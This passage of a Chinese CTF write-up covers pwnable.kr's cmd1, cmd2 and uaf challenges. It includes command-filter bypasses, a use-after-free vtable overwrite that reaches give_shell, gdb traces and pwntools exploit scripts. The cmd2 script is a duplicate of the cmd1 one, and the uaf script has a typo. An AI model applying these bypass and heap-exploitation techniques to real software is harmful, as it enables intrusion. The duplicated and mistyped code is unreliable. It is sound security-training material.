    <span class="hljs-keyword">if</span>(filter(argv[<span class="hljs-number">1</span>])) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    system( argv[<span class="hljs-number">1</span>] );
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8BBE;&#x7F6E;&#x4E86;PATH &#x5230;/thankyoueverymuch,&#x6240;&#x4EE5;&#x5728;/bin&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x6BD4;&#x5982;ls,pwd&#x5565;&#x7684;&#x5C31;&#x4E0D;&#x80FD;&#x7528;&#x4E86;&#x3002;&#x3002;&#x3002;&#x3002;</p>
<p>&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x7EDD;&#x5BF9;&#x5F15;&#x7528;&#x554A;&#xFF0C;&#x7136;&#x540E;cat&#x662F;&#x652F;&#x6301;&#x901A;&#x914D;&#x7B26;&#x7684;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x4E86;</p>
<p>Exp:</p>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

shell=ssh(host=<span class="hljs-string">&apos;pwnable.kr&apos;</span>,user=<span class="hljs-string">&apos;cmd1&apos;</span>,password=<span class="hljs-string">&apos;guest&apos;</span>,port=<span class="hljs-number">2222</span>)
<span class="hljs-comment">#shell.download_file(&apos;./cmd1.c&apos;)</span>
sh = shell.run(<span class="hljs-string">&apos;./cmd1 &quot;/bin/cat fl*&quot; &apos;</span>)
sh.interactive()
</code></pre>
<h2 id="0x0f-cmd2"><a name="0x0f-cmd2" class="anchor-navigation-ex-anchor" href="#0x0f-cmd2"><i class="fa fa-link" aria-hidden="true"></i></a>0x0F cmd2</h2>
<p>&#x7B97;&#x662F;cmd1&#x7684;&#x8FDB;&#x9636;&#x7248;&#x672C;</p>
<pre><code class="lang-python"><span class="hljs-comment">#include &lt;stdio.h&gt;</span>
<span class="hljs-comment">#include &lt;string.h&gt;</span>

int filter(char* cmd){
    int r=<span class="hljs-number">0</span>;
    r += strstr(cmd, <span class="hljs-string">&quot;=&quot;</span>)!=<span class="hljs-number">0</span>;
    r += strstr(cmd, <span class="hljs-string">&quot;PATH&quot;</span>)!=<span class="hljs-number">0</span>;
    r += strstr(cmd, <span class="hljs-string">&quot;export&quot;</span>)!=<span class="hljs-number">0</span>;
    r += strstr(cmd, <span class="hljs-string">&quot;/&quot;</span>)!=<span class="hljs-number">0</span>;
    r += strstr(cmd, <span class="hljs-string">&quot;`&quot;</span>)!=<span class="hljs-number">0</span>;
    r += strstr(cmd, <span class="hljs-string">&quot;flag&quot;</span>)!=<span class="hljs-number">0</span>;
    <span class="hljs-keyword">return</span> r;
}

extern char** environ;
void delete_env(){
    char** p;
    <span class="hljs-keyword">for</span>(p=environ; *p; p++)    memset(*p, <span class="hljs-number">0</span>, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
    delete_env();
    putenv(<span class="hljs-string">&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;</span>);
    <span class="hljs-keyword">if</span>(filter(argv[<span class="hljs-number">1</span>])) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    printf(<span class="hljs-string">&quot;%s\n&quot;</span>, argv[<span class="hljs-number">1</span>]);
    system( argv[<span class="hljs-number">1</span>] );
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>&#x8FD9;&#x6B21;&#x8FDE;&#x659C;&#x6760;&#x90FD;&#x7ED9;&#x8FC7;&#x6EE4;&#x4E86;&#x3002;&#x3002;&#x3002;</p>
<p>&#x4F46;&#x662F; bash&#x91CC;&#x53EF;&#x4EE5;&#x7528; $()&#x53D6;&#x503C;</p>
<p>&#x6BD4;&#x5982;&#x6211;&#x4EEC;cd &#x5230;&#x6839;&#x76EE;&#x5F55;</p>
<p>$(pwd)&#x5C31;&#x76F8;&#x5F53;&#x4E8E;&#x659C;&#x6760;&#x4E86;</p>
<p>&#x7136;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x4E86;</p>
<p>&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x5751;&#x70B9;&#x662F;</p>
<p>&#x4E0D;&#x80FD;&#x7528;&#x201C;&#x201D;&#x5305;&#x88F9;&#x53C2;&#x6570;&#x4E86;</p>
<p>&#x56E0;&#x4E3A;&#x5982;&#x4E0B;</p>
<p>bash&#x91CC;&#x9762;&#x5173;&#x4E8E;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x53CC;&#x5F15;&#x53F7;&#xFF0C;&#x53CD;&#x659C;&#x6760;&#x7684;&#x5904;&#x7406;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x5B57;&#x7B26;</th>
<th style="text-align:center">&#x8BF4;&#x660E;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">&#x2019;(&#x5355;&#x5F15;&#x53F7;)</td>
<td style="text-align:center">&#x53C8;&#x53EB;&#x786C;&#x8F6C;&#x4E49;&#xFF0C;&#x5176;&#x5185;&#x90E8;&#x6240;&#x6709;&#x7684;shell &#x5143;&#x5B57;&#x7B26;&#x3001;&#x901A;&#x914D;&#x7B26;&#x90FD;&#x4F1A;&#x88AB;&#x5173;&#x6389;&#x3002;&#x6CE8;&#x610F;&#xFF0C;&#x786C;&#x8F6C;&#x4E49;&#x4E2D;&#x4E0D;&#x5141;&#x8BB8;&#x51FA;&#x73B0;&#x2019;(&#x5355;&#x5F15;&#x53F7;)</td>
</tr>
<tr>
<td style="text-align:center">&#x201C;&#x201D;(&#x53CC;&#x5F15;&#x53F7;)</td>
<td style="text-align:center">&#x53C8;&#x53EB;&#x8F6F;&#x8F6C;&#x4E49;&#xFF0C;&#x5176;&#x5185;&#x90E8;&#x53EA;&#x5141;&#x8BB8;&#x51FA;&#x73B0;&#x7279;&#x5B9A;&#x7684;shell &#x5143;&#x5B57;&#x7B26;&#xFF1A;$&#x7528;&#x4E8E;&#x53C2;&#x6570;&#x4EE3;&#x6362; `&#x7528;&#x4E8E;&#x547D;&#x4EE4;&#x4EE3;&#x66FF;</td>
</tr>
<tr>
<td style="text-align:center">\(&#x53CD;&#x659C;&#x6760;)</td>
<td style="text-align:center">&#x53C8;&#x53EB;&#x8F6C;&#x4E49;&#xFF0C;&#x53BB;&#x9664;&#x5176;&#x540E;&#x7D27;&#x8DDF;&#x7684;&#x5143;&#x5B57;&#x7B26;&#x6216;&#x901A;&#x914D;&#x7B26;&#x7684;&#x7279;&#x6B8A;&#x610F;&#x4E49;&#x3002;</td>
</tr>
</tbody>
</table>
<p>Exp:</p>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

shell=ssh(host=<span class="hljs-string">&apos;pwnable.kr&apos;</span>,user=<span class="hljs-string">&apos;cmd1&apos;</span>,password=<span class="hljs-string">&apos;guest&apos;</span>,port=<span class="hljs-number">2222</span>)
<span class="hljs-comment">#shell.download_file(&apos;./cmd1.c&apos;)</span>
sh = shell.run(<span class="hljs-string">&apos;./cmd1 &quot;/bin/cat fl*&quot; &apos;</span>)
sh.interactive()
</code></pre>
<h2 id="0x10-uaf"><a name="0x10-uaf" class="anchor-navigation-ex-anchor" href="#0x10-uaf"><i class="fa fa-link" aria-hidden="true"></i></a>0x10 uaf</h2>
<h3 id="&#x524D;&#x7F6E;&#x77E5;&#x8BC6;&#xFF1A;&#x7C7B;&#x91CD;&#x8F7D;&#xB7;&#x865A;&#x51FD;&#x6570;"><a name="&#x524D;&#x7F6E;&#x77E5;&#x8BC6;&#xFF1A;&#x7C7B;&#x91CD;&#x8F7D;&#xB7;&#x865A;&#x51FD;&#x6570;" class="anchor-navigation-ex-anchor" href="#&#x524D;&#x7F6E;&#x77E5;&#x8BC6;&#xFF1A;&#x7C7B;&#x91CD;&#x8F7D;&#xB7;&#x865A;&#x51FD;&#x6570;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x524D;&#x7F6E;&#x77E5;&#x8BC6;&#xFF1A;&#x7C7B;&#x91CD;&#x8F7D;&#xB7;&#x865A;&#x51FD;&#x6570;</h3>
<pre><code>&#x5728;cpp&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x7C7B;&#x4E2D;&#x6709;&#x865A;&#x51FD;&#x6570;&#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x5C31;&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#x865A;&#x51FD;&#x6570;&#x8868;&#x7684;&#x6307;&#x9488;__vfptr&#xFF0C;&#x5728;&#x7C7B;&#x5BF9;&#x8C61;&#x6700;&#x5F00;&#x59CB;&#x7684;&#x5185;&#x5B58;&#x6570;&#x636E;&#x4E2D;&#x3002;&#x4E4B;&#x540E;&#x662F;&#x7C7B;&#x4E2D;&#x7684;&#x6210;&#x5458;&#x53D8;&#x91CF;&#x7684;&#x5185;&#x5B58;&#x6570;&#x636E;&#x3002;

&#x5BF9;&#x4E8E;&#x5B50;&#x7C7B;&#xFF0C;&#x6700;&#x5F00;&#x59CB;&#x7684;&#x5185;&#x5B58;&#x6570;&#x636E;&#x8BB0;&#x5F55;&#x7740;&#x7236;&#x7C7B;&#x5BF9;&#x8C61;&#x7684;&#x62F7;&#x8D1D;&#xFF08;&#x5305;&#x62EC;&#x7236;&#x7C7B;&#x865A;&#x51FD;&#x6570;&#x8868;&#x6307;&#x9488;&#x548C;&#x6210;&#x5458;&#x53D8;&#x91CF;&#xFF09;&#x3002; &#x4E4B;&#x540E;&#x662F;&#x5B50;&#x7C7B;&#x81EA;&#x5DF1;&#x7684;&#x6210;&#x5458;&#x53D8;&#x91CF;&#x6570;&#x636E;&#x3002;

&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x7C7B;&#x4E2D;&#x6709;&#x865A;&#x51FD;&#x6570;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x5EFA;&#x7ACB;&#x4E00;&#x5F20;&#x865A;&#x51FD;&#x6570;&#x8868;vtable&#xFF0C;&#x5B50;&#x7C7B;&#x7EE7;&#x627F;&#x7236;&#x7C7B;vtable&#xFF0C;&#x82E5;&#xFF0C;&#x7236;&#x7C7B;&#x7684;vtable&#x4E2D;&#x79C1;&#x6709;(private)&#x865A;&#x51FD;&#x6570;,&#x5219;&#x5B50;&#x7C7B;vtable&#x4E2D;&#x540C;&#x6837;&#x6709;&#x8BE5;&#x79C1;&#x6709;(private)&#x865A;&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;&#x3002;&#x6CE8;&#x610F;&#x8FD9;&#x5E76;&#x4E0D;&#x662F;&#x76F4;&#x63A5;&#x7EE7;&#x627F;&#x4E86;&#x79C1;&#x6709;(private)&#x865A;&#x51FD;&#x6570;

&#x5F53;&#x5B50;&#x7C7B;&#x91CD;&#x8F7D;&#x7236;&#x7C7B;&#x865A;&#x51FD;&#x6570;&#x65F6;&#xFF0C;&#x4FEE;&#x6539;vtable&#x540C;&#x540D;&#x51FD;&#x6570;&#x5730;&#x5740;&#xFF0C;&#x6539;&#x4E3A;&#x6307;&#x5411;&#x5B50;&#x7C7B;&#x7684;&#x51FD;&#x6570;&#x5730;&#x5740;&#xFF0C;&#x82E5;&#x5B50;&#x7C7B;&#x4E2D;&#x6709;&#x65B0;&#x7684;&#x865A;&#x51FD;&#x6570;&#xFF0C;&#x5728;vtable&#x5C3E;&#x90E8;&#x6DFB;&#x52A0;&#x3002;

vptr&#x6BCF;&#x4E2A;&#x5BF9;&#x8C61;&#x90FD;&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#xFF0C;&#x800C;vptable&#x662F;&#x6BCF;&#x4E2A;&#x7C7B;&#x6709;&#x4E00;&#x4E2A;&#xFF0C;vptr&#x6307;&#x5411;vtable&#xFF0C;&#x4E00;&#x4E2A;&#x7C7B;&#x4E2D;&#x5C31;&#x7B97;&#x6709;&#x591A;&#x4E2A;&#x865A;&#x51FD;&#x6570;&#xFF0C;&#x4E5F;&#x53EA;&#x6709;&#x4E00;&#x4E2A;vptr&#xFF1B;&#x505A;&#x591A;&#x91CD;&#x7EE7;&#x627F;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x7EE7;&#x627F;&#x4E86;&#x591A;&#x4E2A;&#x7236;&#x7C7B;&#xFF0C;&#x5C31;&#x4F1A;&#x6709;&#x591A;&#x4E2A;vptr

&#x4F5C;&#x8005;&#xFF1A;&#x770B;&#x96EA;&#x5B66;&#x9662;
&#x94FE;&#x63A5;&#xFF1A;https://www.jianshu.com/p/a66adda1d0be
&#x6765;&#x6E90;&#xFF1A;&#x7B80;&#x4E66;
&#x8457;&#x4F5C;&#x6743;&#x5F52;&#x4F5C;&#x8005;&#x6240;&#x6709;&#x3002;&#x5546;&#x4E1A;&#x8F6C;&#x8F7D;&#x8BF7;&#x8054;&#x7CFB;&#x4F5C;&#x8005;&#x83B7;&#x5F97;&#x6388;&#x6743;&#xFF0C;&#x975E;&#x5546;&#x4E1A;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#x3002;
</code></pre><p><a href="../assets/images/vtable-1.jpg" data-lightbox="9bb03f4f-2199-4845-8aa1-b6448edf4918" data-title="img"><img src="../assets/images/vtable-1.jpg" alt="img"></a></p>
<p><strong>&#x5355;&#x4E00;&#x7EE7;&#x627F;&#xFF0C;&#x65E0;&#x865A;&#x51FD;&#x6570;&#x91CD;&#x8F7D;</strong></p>
<p><a href="../assets/images/vtable-2.jpg" data-lightbox="cb1e5d82-5b39-44d1-9a85-55335d1d9a54" data-title="img"><img src="../assets/images/vtable-2.jpg" alt="img"></a></p>
<p><strong>&#x5355;&#x4E00;&#x7EE7;&#x627F;&#xFF0C;&#x91CD;&#x8F7D;&#x4E86;&#x865A;&#x51FD;&#x6570;</strong></p>
<p><a href="../assets/images/vtable-3.jpg" data-lightbox="ee2a0065-9de9-44df-b184-a3a3d8708a1e" data-title="img"><img src="../assets/images/vtable-3.jpg" alt="img"></a></p>
<p>&#x6240;&#x4EE5;&#x5728;&#x672C;&#x9898;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4FEE;&#x6539;Man&#x7C7B;&#x91CD;&#x8F7D;&#x7684;&#x865A;&#x51FD;&#x6570;&#x5730;&#x5740;&#x6307;&#x5411;&#x4ECE;Human&#x62F7;&#x8D1D;&#x8FC7;&#x6765;&#x7684;give_shell&#x51FD;&#x6570;</p>
<pre><code class="lang-bash">gdb-peda$ file uaf
Reading symbols from uaf...(no debugging symbols found)...done.
gdb-peda$ b *0x0000000000400F13 <span class="hljs-comment">#new man&#x7684;&#x51FD;&#x6570;&#x5730;&#x5740; &#x5728;ida &#x4E2D;&#x53EF;&#x770B;&#x5230;</span>
Breakpoint 1 at 0x400f13 
gdb-peda$ r 
Starting program: /root/codes/pwnable.kr/uaf
[----------------------------------registers-----------------------------------]
RAX: 0x614ea0 --&gt; 0x0
RBX: 0x614ea0 --&gt; 0x0
RCX: 0x614eb0 --&gt; 0x0
RDX: 0x19
RSI: 0x7ffffffee180
RDI: 0x614ea0 --&gt; 0x0
RBP: 0x7ffffffee1d0
RSP: 0x7ffffffee170
RIP: 0x400f13 --&gt; 0x5d89480000034ce8
R8 : 0x614ea0 --&gt; 0x0
R9 : 0x7fffff78afc0 --&gt; 0x602210 --&gt; 0x7fffff6649e0 (&lt;_ZN10__cxxabiv117__class_<span class="hljs-built_in">type</span>_infoD2Ev&gt;:            )R10: 0x20 (<span class="hljs-string">&apos; &apos;</span>)
R11: 0x0
R12: 0x7ffffffee180
R13: 0x7ffffffee2b0
R14: 0x0
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign <span class="hljs-built_in">trap</span> INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400f08 &lt;main+68&gt;:  mov    edx,0x19
   0x400f0d &lt;main+73&gt;:  mov    rsi,r12
   0x400f10 &lt;main+76&gt;:  mov    rdi,rbx
=&gt; 0x400f13 &lt;main+79&gt;:  call   0x401264 &lt;_ZN3ManC2ESsi&gt;
   0x400f18 &lt;main+84&gt;:  mov    QWORD PTR [rbp-0x38],rbx
   0x400f1c &lt;main+88&gt;:  lea    rax,[rbp-0x50]
   0x400f20 &lt;main+92&gt;:  mov    rdi,rax
   0x400f23 &lt;main+95&gt;:  call   0x400d00 &lt;_ZNSsD1Ev@plt&gt;
Guessed arguments:
arg[0]: 0x614ea0 --&gt; 0x0
arg[1]: 0x7ffffffee180
arg[2]: 0x19
[------------------------------------stack-------------------------------------]
Invalid <span class="hljs-variable">$SP</span> address: 0x7ffffffee170
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400f13 <span class="hljs-keyword">in</span> main ()
gdb-peda$ ni <span class="hljs-comment">#&#x6267;&#x884C;&#x4E00;&#x884C;&#x6E90;&#x7A0B;&#x5E8F;&#x4EE3;&#x7801;&#xFF08;&#x6C47;&#x7F16;&#x7EA7;&#x522B;&#xFF09;&#xFF0C;&#x6B64;&#x884C;&#x4EE3;&#x7801;&#x4E2D;&#x7684;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x4E5F;&#x4E00;&#x5E76;&#x6267;&#x884C;&#x3002;</span>
[----------------------------------registers-----------------------------------]
RAX: 0x614ea0 --&gt; 0x401570 --&gt; 0x40117a (&lt;_ZN5Human10give_shellEv&gt;:     push   rbp)
RBX: 0x614ea0 --&gt; 0x401570 --&gt; 0x40117a (&lt;_ZN5Human10give_shellEv&gt;:     push   rbp)
RCX: 0x614eb0 --&gt; 0x614e88 --&gt; 0x6b63614a (<span class="hljs-string">&apos;Jack&apos;</span>)
RDX: 0x19
RSI: 0x7ffffffee180
RDI: 0x7fffff7982e0 --&gt; 0x0
RBP: 0x7ffffffee1d0
RSP: 0x7ffffffee170
RIP: 0x400f18 --&gt; 0xb0458d48c85d8948
R8 : 0x614ea0 --&gt; 0x401570 --&gt; 0x40117a (&lt;_ZN5Human10give_shellEv&gt;:     push   rbp)
R9 : 0x7fffff78afc0 --&gt; 0x602210 --&gt; 0x7fffff6649e0 (&lt;_ZN10__cxxabiv117__class_<span class="hljs-built_in">type</span>_infoD2Ev&gt;:            )R10: 0x7fffff5f909d (<span class="hljs-string">&quot;_ZNSs6assignERKSs&quot;</span>)
R11: 0x7fffff6a72c0 (&lt;_ZNSs6assignERKSs&gt;:       push   r12)
R12: 0x7ffffffee180
R13: 0x7ffffffee2b0
R14: 0x0
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign <span class="hljs-built_in">trap</span> INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400f0d &lt;main+73&gt;:  mov    rsi,r12
   0x400f10 &lt;main+76&gt;:  mov    rdi,rbx
   0x400f13 &lt;main+79&gt;:  call   0x401264 &lt;_ZN3ManC2ESsi&gt;
=&gt; 0x400f18 &lt;main+84&gt;:  mov    QWORD PTR [rbp-0x38],rbx
   0x400f1c &lt;main+88&gt;:  lea    rax,[rbp-0x50]
   0x400f20 &lt;main+92&gt;:  mov    rdi,rax
   0x400f23 &lt;main+95&gt;:  call   0x400d00 &lt;_ZNSsD1Ev@plt&gt;
   0x400f28 &lt;main+100&gt;: lea    rax,[rbp-0x12]
[------------------------------------stack-------------------------------------]
Invalid <span class="hljs-variable">$SP</span> address: 0x7ffffffee170
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000400f18 <span class="hljs-keyword">in</span> main ()
gdb-peda$ p /x <span class="hljs-variable">$rbx</span> <span class="hljs-comment">#&#x67E5;&#x770B;&#x5B9E;&#x4F8B;&#x5316;&#x7684;Man&#x5BF9;&#x8C61;&#x5730;&#x5740;</span>
<span class="hljs-variable">$1</span> = 0x614ea0
gdb-peda$ x /10w 0x614ea0 <span class="hljs-comment">#&#x67E5;&#x770B;&#x5B9E;&#x4F8B;&#x5316;&#x7684;Man&#x5185;&#x5B58;&#x7A7A;&#x95F4; &#x865A;&#x8868;&#x6307;&#x9488;&#x5728;&#x9996;&#x90E8; &#x5373; 0x00401570</span>
0x614ea0:       0x00401570      0x00000000      0x00000019      0x00000000
0x614eb0:       0x00614e88      0x00000000      0x0000f151      0x00000000
0x614ec0:       0x00000000      0x00000000
gdb-peda$ x /10 0x00401570 <span class="hljs-comment">#&#x67E5;&#x770B;&#x865A;&#x8868; &#x7ED3;&#x5408;ida &#x53EF;&#x53D1;&#x73B0; 0x0040117a &#x5B58;&#x653E;&#x7684;&#x662F; give_shell&#x7684;&#x51FD;&#x6570;&#x5730;&#x5740; 0x004012d2 &#x5B58;&#x653E;&#x7684;&#x662F;man::introduce&#x7684;&#x51FD;&#x6570;&#x5730;&#x5740;</span>
0x401570 &lt;_ZTV3Man+16&gt;: 0x0040117a      0x00000000      0x004012d2      0x00000000
0x401580 &lt;_ZTV5Human&gt;:  0x00000000      0x00000000      0x004015f0      0x00000000
0x401590 &lt;_ZTV5Human+16&gt;:       0x0040117a      0x00000000
</code></pre>
<h3 id="use-after-free"><a name="use-after-free" class="anchor-navigation-ex-anchor" href="#use-after-free"><i class="fa fa-link" aria-hidden="true"></i></a>Use-After-Free</h3>
<blockquote>
<p>&#x5F53;&#x6240;&#x6307;&#x5411;&#x7684;&#x5BF9;&#x8C61;&#x88AB;&#x91CA;&#x653E;&#x6216;&#x8005;&#x6536;&#x56DE;&#xFF0C;&#x4F46;&#x662F;&#x5BF9;&#x8BE5;&#x6307;&#x9488;&#x6CA1;&#x6709;&#x4F5C;&#x4EFB;&#x4F55;&#x7684;&#x4FEE;&#x6539;&#xFF0C;&#x4EE5;&#x81F3;&#x4E8E;&#x8BE5;&#x6307;&#x9488;&#x4ECD;&#x65E7;&#x6307;&#x5411;&#x5DF2;&#x7ECF;&#x56DE;&#x6536;&#x7684;&#x5185;&#x5B58;&#x5730;&#x5740;&#xFF0C;&#x6B64;&#x60C5;&#x51B5;&#x4E0B;&#x8BE5;&#x6307;&#x9488;&#x4FBF;&#x79F0;&#x8FF7;&#x9014;&#x6307;&#x9488;&#x3002;&#x82E5;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5C06;&#x8FD9;&#x90E8;&#x5206;&#x5DF2;&#x7ECF;&#x91CA;&#x653E;&#x7684;&#x5185;&#x5B58;&#x91CD;&#x65B0;&#x5206;&#x914D;&#x7ED9;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#xFF0C;&#x800C;&#x539F;&#x6765;&#x7684;&#x7A0B;&#x5E8F;&#x91CD;&#x65B0;&#x5F15;&#x7528;&#x73B0;&#x5728;&#x7684;&#x8FF7;&#x9014;&#x6307;&#x9488;&#xFF0C;&#x5219;&#x5C06;&#x4EA7;&#x751F;&#x65E0;&#x6CD5;&#x9884;&#x6599;&#x7684;&#x540E;&#x679C;</p>
</blockquote>
<p>&#x5177;&#x4F53;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;&#x56FE;</p>
<p><a href="../assets/images/uaf.jpg" data-lightbox="ed4631e4-f05a-4c1a-85b8-50820a705638" data-title="img"><img src="../assets/images/uaf.jpg" alt="img"></a></p>
<h3 id="&#x5206;&#x6790;&#x6E90;&#x7801;"><a name="&#x5206;&#x6790;&#x6E90;&#x7801;" class="anchor-navigation-ex-anchor" href="#&#x5206;&#x6790;&#x6E90;&#x7801;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5206;&#x6790;&#x6E90;&#x7801;</h3>
<pre><code class="lang-cpp">    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){
        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;1. use\n2. after\n3. free\n&quot;</span>;
        <span class="hljs-built_in">cin</span> &gt;&gt; op;

        <span class="hljs-keyword">switch</span>(op){
            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
                m-&gt;introduce();
                w-&gt;introduce();
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
                len = atoi(argv[<span class="hljs-number">1</span>]);
                data = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[len];
                read(open(argv[<span class="hljs-number">2</span>], O_RDONLY), data, len);
                <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;your data is allocated&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
                <span class="hljs-keyword">delete</span> m;
                <span class="hljs-keyword">delete</span> w;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">break</span>;
        }
    }
</code></pre>
<p>&#x6839;&#x636E;uaf&#x7684;&#x539F;&#x7406;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5148;free &#x7136;&#x540E;&#x518D;&#x5229;&#x7528;after&#x4FEE;&#x6539;Dangling pointer&#x6307;&#x5411;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x7136;&#x540E;&#x518D;use&#x4E00;&#x4E0B;&#x5C31;&#x884C;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x4FEE;&#x6539;&#x865A;&#x8868;&#x6307;&#x9488;&#xFF0C;&#x6765;&#x5229;&#x7528;&#x6E90;&#x7801;&#x4E2D;&#x7684;&#x540E;&#x95E8;give_shell()</p>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

shell=ssh(host=<span class="hljs-string">&apos;pwnable.kr&apos;</span>,user=<span class="hljs-string">&apos;uaf&apos;</span>,password=<span class="hljs-string">&apos;guest&apos;</span>,port=<span class="hljs-number">2222</span>)

<span class="hljs-comment">#shell.download_file(&quot;./uaf.cpp&quot;)</span>
<span class="hljs-comment">#shell.download_file(&quot;./uaf&quot;)</span>

v_ptr=<span class="hljs-number">0x00401570</span>

payload=v_ptr<span class="hljs-number">-0x8</span> <span class="hljs-comment">#&#x4FEE;&#x6539;&#x865A;&#x8868;&#x6307;&#x9488;</span>

sh=shell.run(<span class="hljs-string">&apos;sh&apos;</span>)
sh.sendline(<span class="hljs-string">&apos;python -c &quot;print&quot; &apos;</span>+p64(payload)+<span class="hljs-string">&apos;&gt; /tmp/exp.txt&apos;</span>)
sh.sendline(<span class="hljs-string">&quot;./uaf 24 /tmp/exp.txt&quot;</span>)<span class="hljs-comment">#Man &#x5BF9;&#x8C61;&#x5206;&#x914D;&#x7684;&#x5806;&#x7A7A;&#x95F4;&#x662F;24&#x4E2A;&#x5B57;&#x8282;</span>
sh.sendline(<span class="hljs-string">&quot;3&quot;</span>)
sh.sendline(<span class="hljs-string">&quot;2&quot;</span>)<span class="hljs-comment">#&#x56E0;&#x4E3A;&#x5148;free m&#x518D;free w&#xFF0C;&#x6240;&#x4EE5;&#x4E3A;&#x4E86;&#x518D;&#x6B21;&#x62FF;&#x5230;m&#x6240;&#x6307;&#x5411;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5206;&#x914D;&#x4E24;&#x6B21;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x5F97;&#x5230;w&#x6240;&#x6307;&#x5411;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x7B2C;&#x4E8C;&#x6B21;&#x624D;&#x518D;&#x6B21;&#x5F97;&#x5230;m&#x6240;&#x6307;&#x5411;&#x7684;&#x7A7A;&#x95F4;</span>
sh.sendline(<span class="hljs-string">&quot;2&quot;</span>)
sh.sendlune(<span class="hljs-string">&quot;1&quot;</span>)
sh.interactive()
</code></pre>
<h3 id="&#x53C2;&#x8003;&#x8D44;&#x6599;_1"><a name="&#x53C2;&#x8003;&#x8D44;&#x6599;_1" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x8003;&#x8D44;&#x6599;_1"><i class="fa fa-link" aria-hidden="true"></i></a>&#x53C2;&#x8003;&#x8D44;&#x6599;</h3>
<p><a href="https://www.jianshu.com/p/a66adda1d0be" target="_blank">https://www.jianshu.com/p/a66adda1d0be</a></p>
<p><a href="https://zh.wikipedia.org/wiki/&#x8FF7;&#x9014;&#x6307;&#x9488;" target="_blank">https://zh.wikipedia.org/wiki/%E8%BF%B7%E9%80%94%E6%8C%87%E9%92%88</a></p>
<h2 id="0x11-memcpy"><a name="0x11-memcpy" class="anchor-navigation-ex-anchor" href="#0x11-memcpy"><i class="fa fa-link" aria-hidden="true"></i></a>0x11 memcpy</h2>
<p>&#x770B;&#x6E90;&#x7801;&#x89C9;&#x5F97;&#xFF0C;&#x771F;&#x7684;&#x5C31;&#x968F;&#x4FBF;&#x8F93;&#x4E00;&#x4E0B;&#x6267;&#x884C;&#x5B8C;&#x5B9E;&#x9A8C;&#x5C31;&#x597D;&#x4E86;&#xFF1F;</p>
<p>&#x4F46;&#x662F;&#x968F;&#x4FBF;&#x8F93;&#x503C;&#x5F97;&#x8BDD;&#x4F1A;crash....</p>
<p>&#x95EE;&#x9898;&#x51FA;&#x5728; movntps &#x8FD9;&#x6761;&#x6C47;&#x7F16;&#x6307;&#x4EE4;&#x4E0A;</p>
<blockquote>
